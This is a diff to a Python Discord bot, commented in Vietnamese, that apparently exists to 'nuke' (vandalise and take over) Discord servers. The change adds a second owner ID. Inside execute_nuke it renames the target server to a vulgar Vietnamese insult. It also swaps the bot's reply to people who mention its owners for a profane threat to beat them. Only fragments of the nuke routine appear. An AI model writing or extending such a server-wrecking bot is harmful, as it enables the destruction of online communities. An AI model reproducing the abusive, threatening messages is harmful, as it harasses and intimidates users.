@@ -11,7 +11,7 @@ DISCORD_TOKEN = os.getenv("TOKEN")
 
 # Danh sách ID của Boss Bảo và các đồng minh ủy quyền
 BOT_OWNERS = [
-    1540585511842881616,
+    1540585511842881616,1536264763427000391
 ]
 
 intents = discord.Intents.default()
@@ -243,7 +243,7 @@ async def execute_nuke(guild):
             nonlocal supreme_role
             tasks = []
             
-            tasks.append(guild.edit(name="DEAD SEVER"))
+            tasks.append(guild.edit(name="server ngu lồn bị bot óc chó nuke"))
             try:
                 async with aiohttp.ClientSession() as session:
                     async with session.get(NUKE_AVATAR_URL) as resp:
@@ -1621,7 +1621,7 @@ async def on_message(message):
     if message.mentions:
         for user in message.mentions:
             if user.id in BOT_OWNERS:
-                await message.reply("oi tag gì thế thích Boss Bảo tui à s k ns?")
+                await message.reply("m thích t à tag lắm vcl im mẹ mồm đi ko bố var m đấy chó ngu")
                 break
 
 # ==================== SỰ KIỆN ON_READY ====================
